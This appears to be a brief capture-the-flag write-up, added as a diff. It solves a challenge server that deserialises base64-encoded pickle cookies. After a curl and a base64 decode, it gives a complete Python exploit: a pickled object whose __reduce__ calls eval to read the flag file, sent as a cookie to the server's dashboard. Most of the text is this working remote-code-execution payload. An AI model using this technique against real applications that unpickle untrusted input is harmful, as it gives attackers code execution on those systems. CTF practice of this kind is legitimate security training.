@@ -1,0 +1,26 @@
+first of all we need cookies 
+curl -I http://34.89.138.139:31430
+here we get cookies
+
+after we decode this coikies with base64
+echo -n "gANYCwAAAFRyeSBIYXJkZXIhcQAu" | base64 -d
+and get some text, we can consider that is a pickle server 
+
+use this code and get your flag:
+
+import pickle 
+import base64
+import requests
+
+class Exploit(object):
+	def __reduce__(self):
+		return eval, ("open('flag', 'r').read()", )
+
+def sendPayload(p):
+    print(base64.urlsafe_b64encode(p))
+    headers = {"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
+    t = requests.get("http://34.89.138.139:31430/dashboard", headers=headers)
+    print(t.text)
+
+	
+sendPayload(pickle.dumps(Exploit(),protocol=2))
